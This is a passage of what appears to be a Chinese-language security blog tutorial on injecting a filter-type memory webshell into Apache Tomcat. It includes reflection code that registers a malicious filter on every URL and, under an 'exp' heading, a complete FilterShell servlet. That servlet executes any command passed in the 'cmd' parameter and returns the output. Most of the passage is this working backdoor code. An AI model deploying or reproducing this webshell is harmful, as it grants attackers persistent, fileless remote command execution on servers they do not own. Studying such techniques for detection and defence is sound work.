+<span class="line"><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> FilterDef </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">Constructor</span><span style="color: #E06C75"> declaredConstructors </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FilterDef</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">();</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">FilterDef</span><span style="color: #E06C75"> o </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (FilterDef) </span><span style="color: #E5C07B">declaredConstructors</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">();</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">o</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilter</span><span style="color: #ABB2BF">(filter);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">o</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilterName</span><span style="color: #ABB2BF">(FilterName);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">o</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilterClass</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">filter</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getName</span><span style="color: #ABB2BF">());</span><span style="color: #E06C75">  </span><span style="color: #7F848E; font-style: italic">//进行内部填充</span></span>
+<span class="line"><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addFilterDef</span><span style="color: #ABB2BF">(o);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//反射获取 FilterMap 并且设置拦截路径，并调用 addFilterMapBefore 将 FilterMap 添加进去  </span></span>
+<span class="line"><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> FilterMap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">Constructor</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> declaredConstructor </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FilterMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">();</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">org</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">apache</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">tomcat</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">util</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">descriptor</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">web</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">FilterMap</span><span style="color: #E06C75"> o1 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (FilterMap)</span><span style="color: #E5C07B">declaredConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">();</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">o1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addURLPattern</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/*&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">o1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilterName</span><span style="color: #ABB2BF">(FilterName);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">o1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDispatcher</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">DispatcherType</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">REQUEST</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">name</span><span style="color: #ABB2BF">());</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addFilterMapBefore</span><span style="color: #ABB2BF">(o1);</span></span></code></pre></div></div></figure>
+</li>
+<li><p>最终将它们都添加到 <code>filterConfig</code> 里面，再放到 <code>web.xml</code> 里面</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> ApplicationFilterConfig </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">Constructor</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> declaredConstructor1 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ApplicationFilterConfig</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Context</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">FilterDef</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">declaredConstructor1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">ApplicationFilterConfig</span><span style="color: #E06C75"> filterConfig </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (ApplicationFilterConfig) </span><span style="color: #E5C07B">declaredConstructor1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(standardContext,o);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">filterConfigs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(FilterName,filterConfig);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Success&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure></li>
+</ul>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.Context</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.core.ApplicationContext</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.core.ApplicationFilterConfig</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.core.StandardContext</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.tomcat.util.descriptor.web.FilterDef</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.tomcat.util.descriptor.web.FilterMap</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.*</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.annotation.WebServlet</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServlet</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServletRequest</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServletResponse</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.IOException</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.InputStream</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Constructor</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Field</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Map</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Scanner</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebServlet</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/demoServlet&quot;</span><span style="color: #E06C75">)  </span></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FilterShell</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HttpServlet</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">protected</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doPost</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">HttpServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//        org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//        org.apache.catalina.core.StandardContext standardContext = (StandardContext) standardroot.getContext();  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//该获取StandardContext测试报错  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">Configs</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">filterConfigs</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF"> {  </span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">//这里是反射获取ApplicationContext的context，也就是standardContext  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ServletContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">servletContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getSession</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getServletContext</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">appctx</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">servletContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;context&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">appctx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ApplicationContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">applicationContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (ApplicationContext) </span><span style="color: #E5C07B">appctx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(servletContext);  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">stdctx</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">applicationContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;context&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">stdctx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">StandardContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">standardContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (StandardContext) </span><span style="color: #E5C07B">stdctx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(applicationContext);  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">FilterName</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;cmd_Filter&quot;</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> Configs </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;filterConfigs&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Configs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> filterConfigs </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (Map) </span><span style="color: #E5C07B">Configs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(standardContext);  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">filterConfigs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(FilterName) </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">){  </span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">Filter</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">filter</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Filter</span><span style="color: #ABB2BF">() {  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">                    @</span><span style="color: #E5C07B">Override</span><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> init</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">FilterConfig</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">filterConfig</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">                    }  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">                    @</span><span style="color: #E5C07B">Override</span><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doFilter</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">servletRequest</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">ServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">servletResponse</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">FilterChain</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">filterChain</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">req</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (HttpServletRequest) servletRequest;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">){  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">                            </span><span style="color: #E5C07B">InputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">in</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">)).</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Scanner</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Scanner</span><span style="color: #ABB2BF">(in).</span><span style="color: #61AFEF">useDelimiter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">A&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">output</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">s</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">hasNext</span><span style="color: #ABB2BF">() </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">s</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">next</span><span style="color: #ABB2BF">() </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">servletResponse</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(output);  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">; }  </span></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #E5C07B">filterChain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(servletRequest,servletResponse);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> }  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">                    @</span><span style="color: #E5C07B">Override</span><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> destroy</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">                    }  </span></span>
+<span class="line"><span style="color: #ABB2BF">                };  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">//反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加  </span></span>
